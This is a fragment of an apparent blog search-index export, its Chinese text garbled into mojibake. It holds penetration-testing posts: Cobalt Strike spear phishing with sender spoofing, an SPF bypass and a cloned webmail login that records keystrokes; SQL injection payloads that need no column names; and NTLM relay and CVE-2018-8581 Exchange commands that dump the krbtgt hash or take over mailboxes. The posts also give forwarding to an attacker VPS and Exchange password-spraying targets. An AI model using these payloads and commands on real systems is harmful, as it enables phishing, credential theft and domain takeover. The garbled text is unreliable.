        <tag>phishing</tag>
        <tag>macro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike Spear Phish]]></title>
    <url>%2Farchives%2Fspear_phish.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹å…³äºSpear phish å’Œå‘ä»¶äººä¼ªé€ çš„å·¥å…·æœ‰å¾ˆå¤šä¸ªï¼Œæ¯”å¦‚gophishã€SimpleEmailSpooferã€å‘½ä»¤è¡Œå·¥å…·swaksç­‰ï¼Œæ¯ä¸ªå·¥å…·éƒ½æœ‰å…¶ç‰¹ç‚¹ï¼Œå½“ç„¶Cobalt Strikeä¹Ÿæœ‰æ­¤åŠŸèƒ½ã€‚å®˜æ–¹ä»‹ç»æˆ³æˆ‘ã€‚ä»Šå¤©ä¸»è¦æ¥ä»‹ç»ä¸€ä¸‹CSé‡Œé¢çš„æ­¤åŠŸèƒ½æ€ä¹ˆä½¿ç”¨ã€‚ 0x01 CS Spear PhishCSçš„Spear Phishä½ç½®åœ¨ï¼š ä¸€å¼ å›¾è¯´æ˜åŠŸèƒ½ï¼š ä½¿ç”¨æ­¤åŠŸèƒ½çš„å‰ææ˜¯éœ€è¦æœ‰ä¸€ä¸ªsmtpæœåŠ¡å™¨æ¥ä¾›æˆ‘ä»¬æ¥è½¬å‘é‚®ä»¶ï¼Œå½“ç„¶å¯ä»¥ä½¿ç”¨å…¬å…±smtpæœåŠ¡ï¼Œå¦å¤–ä¹Ÿå¯ä»¥å‚è€ƒã€ŠSomething about email spoofingã€‹ ä¸­æåˆ°çš„æ–¹æ³•æ¥æ­å»ºã€‚è¿™é‡Œçš„ä½¿ç”¨å¾ˆç®€å•ï¼Œé¦–å…ˆæ„é€ ç›®æ ‡åˆ—è¡¨ï¼Œä½¿ç”¨ï¼š12mail namemail name ä¸­é—´çš„åˆ†éš”ç¬¦ä¸º[tab],å¯ä»¥ä¸æ·»åŠ name æ·»åŠ å¥½ä»¥åå°±æ˜¯è¿™ä¸ªæ ·å­ï¼š ä¸‹é¢ï¼Œè¦é…ç½®å‘ä»¶æ¨¡æ¿ï¼Œè¿™é‡Œé…ç½®å¾ˆç®€å•ï¼Œåªéœ€è¦å¤åˆ¶ä¸€ä»½åŸå§‹é‚®ä»¶å³å¯ï¼Œæ¯”å¦‚ä¸€ä»½å¯†ç é‡ç½®é‚®ä»¶ï¼š é€‰æ‹©æ˜¾ç¤ºåŸå§‹é‚®ä»¶ï¼Œå¹¶å°†å…¶å†…å®¹ä¿å­˜ã€‚ åœ¨è¿™é‡Œå¦‚æœè¦ä¼ªé€ å‘ä»¶äººï¼Œéœ€è¦ä¿®æ”¹From: å¦åˆ™å°±ä¸éœ€è¦åšä»€ä¹ˆåˆ«çš„ä¿®æ”¹ã€‚ä¹‹åï¼Œé…ç½®å¯¹åº”çš„Mail serverï¼Œå°±å¯ä»¥è¿›è¡Œå‘é€é‚®ä»¶äº†ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹,ä¸ºäº†ç»•è¿‡SPFçš„æ£€æŸ¥ï¼ŒBunce toéœ€è®¾ç½®ä¸ºä¸Mail serveråŒåŸŸï¼Œå¦‚Mail serverä¸º mail.evi1cg.me,Bunce toå¯è®¾ç½®ä¸º`admin@evi1cg.me`ã€‚ ä¹‹åç‚¹å‡»Sendåˆ™å¯å‘é€é‚®ä»¶ï¼Œæ”¶åˆ°çš„é‚®ä»¶ä¸æ¨¡æ¿ä¸€è‡´ã€‚ å¦å¤–æŸ¥çœ‹SRFä¸ºPASSçŠ¶æ€ï¼š å¦å¤–ï¼ŒCSä¹Ÿæœ‰å‘é€é™„ä»¶çš„åŠŸèƒ½ï¼Œä½†æ˜¯åŸç‰ˆæœ¬çš„CSå‘é€é™„ä»¶æœ‰ä¸€ä¸ªBugï¼Œå³å¦‚æœé™„ä»¶ä¸ºä¸­æ–‡åç§°ï¼Œåˆ™ä¼šåœ¨æœ€åçš„é‚®ä»¶ä¸­æ˜¾ç¤ºä¹±ç é™„ä»¶ï¼š æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å¯¹CSåŠ¨åˆ€äº†ï¼Œç»è¿‡è°ƒè¯•ï¼ŒæˆåŠŸå®šä½åˆ°mail\Eater.javaï¼Œéœ€è¦å¯¹æ­¤ç±»ä¸­çš„createAttachmentæ–¹æ³•è¿›è¡Œä¿®æ”¹ï¼š1234567891011121314private BodyPart createAttachment(String name) throws IOException &#123; File file = new File(name); String namez = file.getName(); String filename = new String(namez.getBytes("utf-8"),"ISO8859-1"); Body body = (new StorageBodyFactory()).binaryBody((InputStream)(new FileInputStream(name))); Map temp = new HashMap(); temp.put("name", filename); BodyPart bodyPart = new BodyPart(); bodyPart.setBody(body, "application/octet-stream", temp); bodyPart.setContentTransferEncoding("base64"); bodyPart.setContentDisposition("attachment"); bodyPart.setFilename(filename); return bodyPart;&#125; è¿™æ ·å°±å¯ä»¥è§£å†³é™„ä»¶ä¹±ç é—®é¢˜äº†: 0x02 Web cloneå¦å¤–åœ¨è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªä¸Web Cloneç»“åˆçš„åœ°æ–¹ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å…ˆCloneä¸€ä¸ªéœ€ç™»å½•çš„ç½‘ç«™ï¼Œå¦‚ç½‘æ˜“é‚®ç®±ï¼š è¿™é‡Œå¯ä»¥é€‰æ‹©å¼€å¯é”®ç›˜è®°å½•åŠŸèƒ½ã€‚ å¼€å¯Cloneï¼š è®¾ç½®spear phish: Embed URLé€‰æ‹©åˆšåˆšå…‹éš†çš„urlï¼Œå‘é€é‚®ä»¶ï¼Œæ­¤æ—¶ç”¨æˆ·ç‚¹å‡»é‡ç½®æŒ‰é’®ï¼Œåˆ™ä¼šè·³è½¬åˆ°Cloneçš„ç«™ç‚¹ï¼š æ­¤æ—¶ï¼Œç”¨æˆ·è¾“å…¥ä¼šè¢«è®°å½•ï¼š emmm. å¤§æ¦‚å°±ä»‹ç»è¿™ä¹ˆå¤šå§ã€‚]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹æ³¨å…¥]]></title>
    <url>%2Farchives%2Fsqli_without_knowing_columns_names.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹åœ¨ mysql =&gt; 5 çš„ç‰ˆæœ¬ä¸­å­˜åœ¨åº“information_schema,è®°å½•ç€mysqlä¸­æ‰€æœ‰è¡¨çš„ç»“æ„ï¼Œé€šå¸¸ï¼Œåœ¨mysql sqliä¸­ï¼Œæˆ‘ä»¬ä¼šé€šè¿‡æ­¤åº“ä¸­çš„è¡¨å»è·å–å…¶ä»–è¡¨çš„ç»“æ„ï¼Œå³è¡¨åï¼Œåˆ—åç­‰ã€‚ä½†æ˜¯è¿™ä¸ªåº“ä¹Ÿä¼šç»å¸¸è¢«WAFè¿‡æ»¤ã€‚å½“æˆ‘ä»¬é€šè¿‡æš´åŠ›ç ´è§£è·å–åˆ°è¡¨ååï¼Œè¯¥å¦‚ä½•è¿›è¡Œä¸‹ä¸€æ­¥åˆ©ç”¨å‘¢ï¼Ÿ åœ¨information_schemaä¸­ï¼Œé™¤äº†SCHEMATAï¼ŒTABLESï¼ŒCOLUMNSæœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„mysqlä¸­ï¼Œè¿˜æœ‰INNODB_TABLESåŠINNODB_COLUMNSä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚ 0x01 ä¸ä½¿ç”¨è¡¨åæŸ¥è¯¢æ­£å¸¸çš„æŸ¥è¯¢å¦‚ä¸‹ï¼š å…¶ä¸­ï¼Œåˆ—åä¸ºid,name,pass,mail,phoneï¼Œä½¿ç”¨unionæŸ¥è¯¢1select 1,2,3,4,5 union select * from users; æ¥ç€ï¼Œå°±å¯ä»¥ç»§ç»­ä½¿ç”¨æ•°å­—æ¥å¯¹åº”åˆ—,å¦‚3å¯¹åº”äº†è¡¨é‡Œé¢çš„pass:1select `3` from (select 1,2,3,4,5 union select * from users)a; å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š1select b from (select 1,2,3 as b,4,5 union select * from users)a; åœ¨æ³¨å…¥ä¸­æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š1select concat(`2`,0x3a,`3`) from (select 1,2,3,4,5 union select * from users)a limit 1,1; FROM:Extracting data without knowing columns names]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Remote NTLM relaying through CS]]></title>
    <url>%2Farchives%2FRemote_NTLM_relaying_through_CS.html</url>
    <content type="text"><![CDATA[0x00 ä¸ºä»€ä¹ˆå†™è¿™ä¸ªï¼Ÿæœ€è¿‘åœ¨å­¦ä¹ Exchangeåœ¨ææƒä¸­çš„åº”ç”¨çš„æ—¶å€™ï¼Œç¢°åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå³ï¼šå¦‚æœæˆ‘ä»¬ç°åœ¨æ‹¥æœ‰äº†ä¸€ä¸ªå†…ç½‘çš„windowsä¸»æœºï¼Œå¦‚ä½•åˆ©ç”¨è¿™å°ä¸»æœºä½¿ç”¨CVE_2018_8581 ï¼Ÿå¤§æ¦‚çš„ç»“æ„æ˜¯è¿™æ ·ï¼š æ”»å‡»è€…é€šè¿‡æŸç§æ–¹å¼è·å–ä¸€å°åŸŸå†…ä¸»æœºæƒé™ã€‚å¹¶è·å–äº†æ­¤ä¸»æœºçš„åŸŸæˆå‘˜è´¦å·å¯†ç ï¼Œåœ¨è·å–DCåŠExchange Serverçš„ipåœ°å€åï¼Œåˆ©ç”¨CVE_2018_8581 0x01 åˆ©ç”¨æ€è·¯æ€è·¯ä¸€ï¼šç¼–è¯‘pyç‰ˆçš„impacketåœ¨åšè¿™ä¸ªçš„æ—¶å€™ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯æœ‰æ²¡æœ‰windowsä¸‹å¯ç”¨çš„impacketï¼Œåæ¥æ‰¾äº†æ‰¾ï¼Œè¿˜çœŸæœ‰impacket_static_binariesï¼Œäºæ˜¯å°±æ‹¿æ¥ç”¨äº†ã€‚ä½†æ˜¯åæ¥å‘ç°æ˜¯æœ‰é—®é¢˜çš„ã€‚é¦–å…ˆï¼Œåˆ©ç”¨éœ€è¦å…³é—­winçš„445ç«¯å£ï¼Œè¿™ä¸ªå°±éœ€è¦é‡å¯ï¼Œè¿™æ˜¯æˆ‘ä»¬éå¸¸ä¸æ„¿æ„åšçš„ï¼Œå¦å¤–ï¼Œä¼¼ä¹winç‰ˆçš„ntlmrelayx å’Œ smbrelayxè¿˜ä¸èƒ½ç”¨ã€‚ æ‰€ä»¥ç›´æ¥æ”¾å¼ƒäº†ã€‚ æ€è·¯äºŒï¼šé€šè¿‡meterpreterè¿›è¡ŒNTLM relayingè¿™ä¸ªæ€è·¯æ˜¯ä¹‹å‰çœ‹åˆ°çš„ã€ŠRemote NTLM relaying through meterpreter on Windows port 445ã€‹æ¥çš„ã€‚åœ¨è¿™ç¯‡æ–‡ç« é‡Œé¢ï¼Œè¯¦ç»†åˆ†æäº†æ˜¯è°å ç”¨äº†445ï¼Œå¦‚ä½•è¿›è¡Œè½¬å‘å†è¿›è¡ŒRemote NTLM relayingã€‚åˆ©ç”¨CVE_2018_8581ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ªç«¯å£ï¼Œ445å’Œ80(80å¯ä»¥æ˜¯å…¶ä»–ç«¯å£ï¼Œç”¨æ¥å¼€å¯HTTPæœåŠ¡)ï¼Œä½†æ˜¯å®é™…æµ‹è¯•çš„æ—¶å€™ï¼Œå¹¶ä¸é¡ºåˆ©ï¼ŒæˆåŠŸæ·»åŠ è·¯ç”±ï¼Œå¼€å¯ç«¯å£è½¬å‘ï¼Œå¼€å¯ socks4a ä¹‹åï¼Œæœ¬åœ°é€šè¿‡proxychainså¼€å¯ä¸€ä¸ªweb serverï¼Œåœ¨å†…ç½‘å…¶ä»–ä¸»æœºè¯·æ±‚è¿™ä¸ªserverçš„æ—¶å€™ï¼Œå¹¶æœªçœ‹åˆ°ä»»ä½•è¯·æ±‚ï¼ˆå¯èƒ½æ˜¯å§¿åŠ¿ä¸å¯¹ï¼ŒæˆåŠŸçš„å¸ˆå‚…è¿˜æœ›ä¸åèµæ•™ï¼‰ã€‚æ‰€ä»¥é€šè¿‡æ­¤æ–¹å¼ï¼Œä¹Ÿå¹¶æ²¡è¾¾åˆ°æˆ‘æœŸæœ›çš„æ•ˆæœã€‚ æ€è·¯ä¸‰ï¼šé€šè¿‡CSéƒ¨ç½²VPNè¿™ä¸ªä¹Ÿæ˜¯æˆ‘è§‰å¾—æœ€ç®€å•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨ä¸Šé¢ä¸¤ç§æ€è·¯å¤±è´¥ä¹‹åï¼Œå°±åªèƒ½æœŸå¾…è¯•ç”¨è¿™ç§æ–¹å¼æ¥è¿›è¡Œäº†ï¼Œè¿˜å¥½ï¼ŒæˆåŠŸå•¦~ Cobaltstrike çš„covertvpnçš„ä»‹ç»ï¼Œå¯ä»¥çœ‹è¿™é‡Œã€‚ åœ¨è·å–åˆ°ä¸€ä¸ªBeconä¹‹å,å³é”®è¿æ¥-&gt;Pivoting-&gt;Deploy VPN ä¹‹åï¼Œé€‰æ‹©å¯¹åº”çš„å†…ç½‘ip ç‚¹å‡»ADDæ¥æ·»åŠ æœ¬åœ°ç½‘å£ï¼š åœ¨è¿™é‡Œæœ‰å¤šç§æ–¹å¼çš„éš§é“ï¼Œå¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€è¦é€‰æ‹©ï¼Œé»˜è®¤UDPæ˜¯å¼€é”€æœ€å°çš„ä¸€ç§æ–¹å¼ã€‚æ·»åŠ ä»¥åï¼Œç‚¹å‡»Deployåˆ™å¯éƒ¨ç½²æˆåŠŸã€‚ ä¹‹åï¼Œåœ¨Interfacesä¸­å¯ä»¥çœ‹åˆ°å¯¹åº”ä¿¡æ¯ï¼š ä¹‹åæˆ‘ä»¬åœ¨VPSä¸Šé…ç½®æ­¤ç½‘å£ï¼š1sudo ifconfig Interface CIDR example:1sudo ifconfig phear5 10.211.55.225/24 å‰é¢çš„ipåœ°å€å°±æ˜¯è¦ç»™æˆ‘ä»¬çš„ç½‘å£é…ç½®çš„ipåœ°å€ï¼Œç›¸å½“äºåœ¨åŸŸé‡Œé¢æ–°æ¥å…¥äº†ä¸€å°ä¸»æœº ä¹‹åï¼Œå°±å¯ä»¥ä¸å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡äº†ã€‚ è¿™ç§æ–¹å¼æˆ‘å½•äº†ä¸€ä¸ªDemoï¼š Tipsï¼šéƒ¨ç½²VPNåªéœ€è¦æ™®é€šç”¨æˆ·æƒé™å³å¯ã€‚ä½†æ˜¯è·å–å½“å‰ç”¨æˆ·è´¦å·å¯†ç éœ€è¦ææƒã€‚ 0x02 å¦‚ä½•é˜²å¾¡ CVE_2018_8581åˆ é™¤åŸŸå†…æŸç”¨æˆ·çš„DCSyncæƒé™ï¼Œå¯ä½¿ç”¨ PowerViewã€‚ å…·ä½“å‘½ä»¤ä¸ºï¼š1Remove-DomainObjectAcl -TargetIdentity "DC=cgdomain,DC=com" -PrincipalIdentity user -Rights DCSync æ ¹æ®è‡ªå·±çš„å®é™…ç¯å¢ƒè¿›è¡Œä¿®æ”¹ ä¿®å¤Exchageæƒé™ï¼Œå¯ä½¿ç”¨ Fix-DomainObjectDACL.ps1 å…·ä½“å‘½ä»¤ä¸ºï¼š 1. .\Fix-DomainObjectDACL.ps1 -Fix 0x03 è¿›ä¸€æ­¥æµ‹è¯•ç»è¿‡è¿›ä¸€æ­¥æµ‹è¯•ä»¥åŠå¯¹æ¼æ´çš„åŸç†å†æ¬¡å­¦ä¹ ï¼Œå‘ç°å…¶å®æˆ‘ä»¬åªéœ€è¦å¼€å¯ä¸€ä¸ªwebæœåŠ¡å³å¯ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„ç«¯å£(åœ¨impacketä¸­ï¼ŒHTTPRelayServeré»˜è®¤ç«¯å£ä¸º80ï¼ŒExchange2domainå·²æ”¯æŒè‡ªå®šä¹‰ç«¯å£)ã€‚ å½“ç„¶ï¼Œä¸Šè¿° æ€è·¯ä¸‰ å¯¹smbrelayä¹Ÿæ˜¯éå¸¸å¥½ç”¨çš„ä¸€ç§æ–¹å¼ã€‚ç°åœ¨è¡¥å……ä¸€ä¸‹ æ€è·¯äºŒ çš„å…·ä½“åˆ©ç”¨æ–¹æ³•ã€‚ ç”±äºæˆ‘ä»¬ä¸éœ€è¦smb Serverï¼Œæ‰€ä»¥ä¹Ÿä¸éœ€è¦å‘ã€ŠRemote NTLM relaying through meterpreter on Windows port 445ã€‹ä¸­æ‰€è¿°å¯¹445ç«¯å£è¿›è¡Œè½¬å‘ï¼Œæˆ‘ä»¬åªéœ€è¦å°†webç«¯å£è½¬å‘å‡ºæ¥å³å¯ã€‚åœ¨è·å–ä¸€ä¸ªmeterpreterä¼šè¯ä¹‹åï¼Œæ·»åŠ è·¯ç”±:1meterpreter &gt; run post/multi/manage/autoroute ä¹‹åå¼€å¯socks4aä»£ç†ã€‚ ç»è¿‡æµ‹è¯•ï¼Œå‘ç°msfçš„portfwdä¸æ€ä¹ˆç¨³å®šï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©äº†ä½¿ç”¨ewï¼Œå½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨lcxç­‰å…¶ä»–è½¬å‘å·¥å…·ã€‚åœ¨vpsä¸Šå¼€å¯è½¬å‘ï¼š1â˜ lcx ./ew -s lcx_tran -l 8088 -f 127.0.0.1 -g 8044 ç›‘å¬æœ¬åœ°8088ç«¯å£ï¼Œå¹¶å°†æ•°æ®è½¬å‘åˆ°127.0.0.1çš„8044ç«¯å£ ç„¶ååœ¨æˆ‘ä»¬æœ‰æƒé™çš„ä¸»æœºä¸Šæ‰§è¡Œï¼š1C:\Users\sanfeng\Desktop&gt;ew_for_Win.exe -s lcx_tran -l 8044 -f 103.*.*.* -g 8088 ç›‘å¬æœ¬åœ°8044ç«¯å£çš„æ•°æ®ï¼Œå¹¶å°†æ•°æ®è½¬å‘åˆ°103...*çš„8080ç«¯å£ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰æƒé™çš„ä¸»æœºç›‘å¬ç«¯å£=vpsè½¬å‘ç«¯å£=Exchange2domainç›‘å¬ç«¯å£ ä¹‹åï¼Œåœ¨vpsä¸Šé…ç½®proxychainsï¼Œubuntuä¸Šproxychainsçš„é…ç½®æ–‡ä»¶è·¯å¾„ä¸º/etc/proxychains.confã€‚ä¿®æ”¹ä»£ç†é…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š12345[ProxyList]# add proxy here ...# meanwile# defaults set to "tor"socks4 127.0.0.1 1080 ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä¸€æ‰§è¡ŒExchange2domainäº†ï¼š1proxychains python Exchange2domain.py -ah proxyip -ap 8044 -u user -p password -d domain -th DCIP ExchangeIP --just-dc-user krbtgt æ³¨æ„ç›‘å¬ç«¯å£è·Ÿä¸Šé¢ä¸€è‡´ï¼Œproxyipä¸ºæˆ‘ä»¬æœ‰æƒé™çš„ä¸»æœºçš„ipåœ°å€ã€‚ æ‰€ä»¥ï¼Œæ•´ä¸ªæ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼š å¸Œæœ›ä»¥ä¸Šå¯¹ä½ æœ‰å¸®åŠ©ã€‚ 0x04 å‚è€ƒ Remote NTLM relaying through meterpreter on Windows port 445 impacket_static_binaries VPN Pivoting with Cobalt Strike]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchange Privilege Elevation]]></title>
    <url>%2Farchives%2FExchange_Privilege_Elevation.html</url>
    <content type="text"><![CDATA[ç¯å¢ƒDC : 10.211.55.200Exchange (2013): 10.211.55.201Attacker: 10.211.55.2 æ¡ä»¶å¾—åˆ°æŸåŸŸç”¨æˆ·ï¼›ä¸ExchangeæœåŠ¡å™¨å¯äº’é€šï¼Œä¸éœ€è¦å…¥åŸŸï¼› åˆ©ç”¨å·¥å…·https://github.com/Ridter/Exchange2domain å…·ä½“è¿‡ç¨‹è·å–éœ€è¦çš„å‚æ•°ï¼š-ah: è‡ªå·±çš„ç›‘å¬æœåŠ¡å™¨ip -u: å¯ç™»å½•é‚®ç®±çš„ç”¨æˆ·å -p:å¯¹åº”è¯¥ç”¨æˆ·çš„å¯†ç  -d: åŸŸå-th:åŸŸæ§ipåœ°å€è¿˜æœ‰å°±æ˜¯ExchangeæœåŠ¡å™¨åœ°å€ï¼Œé»˜è®¤ä½¿ç”¨Exchangeçš„ç‰ˆæœ¬å·ä¸ºExchange2013ï¼Œå…¶ä»–ç‰ˆæœ¬å¯ä½¿ç”¨--exchange-version æ¥æŒ‡å®šã€‚ Example:1python Exchange2domain.py -ah 10.211.55.2 -u sanfeng -p 1qaz@WSX -d cgdomain.com -th 10.211.55.200 10.211.55.201 è·å–åˆ°hashä»¥åï¼Œå¯é€šè¿‡pash-the-hashæ¥æ‰§è¡Œå‘½ä»¤: å‚è€ƒ Privexchange Abusing Exchange: One API call away from Domain Admin Impacket]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchangeç”¨æˆ·ä¼ªé€ (CVE-2018-8581)]]></title>
    <url>%2Farchives%2FCVE_2018_8581.html</url>
    <content type="text"><![CDATA[ç¯å¢ƒDC : 192.168.31.129Exchange (2013): 192.168.31.129Attacker: 192.168.31.243 æ¡ä»¶å¾—åˆ°ç”¨æˆ·: beiguoxiaä¸ExchangeæœåŠ¡å™¨å¯äº’é€šï¼Œä¸éœ€è¦å…¥åŸŸã€‚ åˆ©ç”¨å·¥å…·https://github.com/WyAtu/CVE-2018-8581/ å…·ä½“è¿‡ç¨‹è·å–æœ¬æœºåœ°å€ï¼š ä¿®æ”¹è„šæœ¬å†…å®¹ï¼š ipä¸ºExchangeæœåŠ¡å™¨çš„ipåœ°å€ï¼Œå…¶ä»–çš„æ”¹æˆå¯¹åº”çš„ä¿¡æ¯,FLAGæ”¹ä¸º1ï¼Œå¢åŠ æƒé™å§”æ‰˜ã€‚ Exploitï¼š1python CVE-2018-8581.py æ·»åŠ æˆåŠŸä»¥åï¼Œæ‰“å¼€outlookå®¢æˆ·ç«¯ã€‚ä½¿ç”¨å·²ç»è·å–çš„é‚®ç®±è´¦å·(æ­¤å¤„ä¸ºbeiguoxia)ç™»å½•ã€‚ ä¾æ¬¡é€‰æ‹©åå¥½è®¾ç½®-è´¦æˆ·-é«˜çº§-ä»£ç†ï¼Œæ·»åŠ é™„åŠ é‚®ç®±ï¼š æ­¤åï¼Œå¯æ¥ç®¡è¢«æ”»å‡»è´¦å·çš„æ”¶ä»¶ç®±ï¼ŒæŸ¥çœ‹æ‰€æœ‰é‚®ä»¶ï¼š åˆ é™¤æƒé™å§”æ‰˜: å°†è„šæœ¬ä¸­FLAGä¿®æ”¹ä¸º0ï¼Œå†æ¬¡æ‰§è¡Œï¼š 1python CVE-2018-8581.py]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>Exchange</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Exchangeåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨]]></title>
    <url>%2Farchives%2FExchange_Hack.html</url>
    <content type="text"><![CDATA[0x00 Exchangeç®€ä»‹Windows Exchange Serverï¼Œæ˜¯å›½å†…å¤–åº”ç”¨éå¸¸å¹¿æ³›çš„é‚®ä»¶æœåŠ¡å™¨ï¼Œæ˜¯å¾®è½¯å…¬å¸çš„ä¸€å¥—ç”µå­é‚®ä»¶æœåŠ¡ç»„ä»¶ã€‚ ç®€å•è€Œè¨€ï¼ŒExchange serverå¯ä»¥è¢«ç”¨æ¥æ„æ¶åº”ç”¨äºä¼ä¸šã€å­¦æ ¡çš„é‚®ä»¶ç³»ç»Ÿã€‚æ‰€ä»¥é€šå¸¸æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ä¹Ÿä¼šå¯¹å…¶è¿›è¡Œæ”»å‡»å°è¯•ã€‚ 0x01 Exchange Endpointé€šå¸¸Exchange Server æœ‰ä»¥ä¸‹endpointï¼Œå³å¯è®¿é—®çš„è¿æ¥å¦‚ä¸‹ï¼š123456789https://Exchangeserver/AutoDiscover/https://Exchangeserver/Ecp/https://Exchangeserver/EWS/https://Exchangeserver/mapi/https://Exchangeserver/Microsoft-Server-ActiveSync/https://Exchangeserver/OAB/https://Exchangeserver/OWA/https://Exchangeserver/PowerShell/https://Exchangeserver/Rpc/ æ¯ä¸ªendpointçš„ä½œç”¨å¦‚ä¸‹ï¼š endpoint è¯´æ˜ /autodiscover è‡ªExchange Server 2007å¼€å§‹æ¨å‡ºçš„ä¸€é¡¹è‡ªåŠ¨æœåŠ¡ï¼Œç”¨äºè‡ªåŠ¨é…ç½®ç”¨æˆ·åœ¨Outlookä¸­é‚®ç®±çš„ç›¸å…³è®¾ç½®ï¼Œç®€åŒ–ç”¨æˆ·ç™»é™†ä½¿ç”¨é‚®ç®±çš„æµç¨‹ã€‚ /ecp â€œExchange Control Panelâ€ Exchangeç®¡ç†ä¸­å¿ƒï¼Œç®¡ç†å‘˜ç”¨äºç®¡ç†ç»„ç»‡ä¸­çš„Exchangeçš„Webæ§åˆ¶å° /ews â€œExchange Web Servicesâ€ Exchange Web Service,å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´åŸºäºHTTPçš„SOAPäº¤äº’ /mapi Outlookè¿æ¥Exchangeçš„é»˜è®¤æ–¹å¼ï¼Œåœ¨2013å’Œ2013ä¹‹åå¼€å§‹ä½¿ç”¨ï¼Œ2010 sp2åŒæ ·æ”¯æŒ /Microsoft-Server-ActiveSync ç”¨äºç§»åŠ¨åº”ç”¨ç¨‹åºè®¿é—®ç”µå­é‚®ä»¶ /OAB â€œOffline Address Bookâ€ ç”¨äºä¸ºOutlookå®¢æˆ·ç«¯æä¾›åœ°å€ç°¿çš„å‰¯æœ¬ï¼Œå‡è½»Exchangeçš„è´Ÿæ‹… /owa â€œOutlook Web APPâ€ Exchange owa æ¥å£ï¼Œç”¨äºé€šè¿‡webåº”ç”¨ç¨‹åºè®¿é—®é‚®ä»¶ã€æ—¥å†ã€ä»»åŠ¡å’Œè”ç³»äººç­‰ /powershell ç”¨äºæœåŠ¡å™¨ç®¡ç†çš„Exchangeç®¡ç†æ§åˆ¶å° /RPC æ—©æœŸçš„Outlookè¿˜ä½¿ç”¨ç§°ä¸ºOutlook Anywhereçš„RPCäº¤äº’ ä»¥ä¸Šendpointä¸­ï¼Œå¸¸ç”¨äºæš´åŠ›ç ´è§£çš„æœ‰/owa ã€/ewsã€/Microsoft-Server-ActiveSync åŠ/autodiscoverï¼Œå¦‚owaçš„æš´åŠ›ç ´è§£ï¼ˆpasswordsprayï¼‰ï¼šæŠ“å–ç™»å½•åŒ…å¦‚ä¸‹ï¼š ç”¨æˆ·åå¯å°è¯•ä½¿ç”¨domain\usernameã€domian.com\usernameã€username ä½¿ç”¨æŸå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£ï¼š /Microsoft-Server-ActiveSync çˆ†ç ´ä¸º401è®¤è¯ï¼Œéœ€è¦å¯¹ç”¨æˆ·è´¦å·å¯†ç è¿›è¡Œbase64å¤„ç†: YWRtaW46YWRtaW4= -&gt; admin:admin /ewsã€/rpc ç­‰å‡ ä¸ªendpointåŒæ ·ä¸º401è®¤è¯ï¼Œè´¦å·å¯†ç çš„åŠ å¯†æ–¹å¼ä¸ºNTLM Authenticateï¼š çˆ†ç ´éœ€å¯¹è´¦å·å¯†ç è¿›è¡Œå¤„ç†ä¹‹ååœ¨è¿›è¡Œã€‚ 0x02 Get UserListéªŒè¯Exchangeå¯¹Exchangeçš„åˆ©ç”¨é¦–å…ˆè¦ç¡®å®šå…¶æ˜¯å¦ä½¿ç”¨äº†exchangeï¼Œå…³äºåˆ¤æ–­çš„æ–¹å¼ï¼Œæˆ‘çŸ¥é“çš„æ–¹å¼æœ‰:1ã€checkO365 2ã€owa ç™»å½•é¡µé¢ï¼Œå¦‚ï¼š 3ã€ç‰¹æ®ŠåŸŸåï¼šè®¿é—®å¦‚ä¸‹åŸŸå1234https://autodiscover.domain.com/autodiscover/autodiscover.xmlhttps://owa.domian/owa/https://mail.domain.com/https://webmail.domain.com/ è·å–ç”¨æˆ·åˆ—è¡¨ä¹‹åæˆ‘ä»¬éœ€è¦è·å–å…¶è‡³å°‘ä¸€ä¸ªè´¦å·çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±éœ€è¦å–æœé›†è·å–æŸåŸŸçš„ç”¨æˆ·åˆ—è¡¨ï¼Œé™¤äº†top usernameè¿›è¡Œçˆ†ç 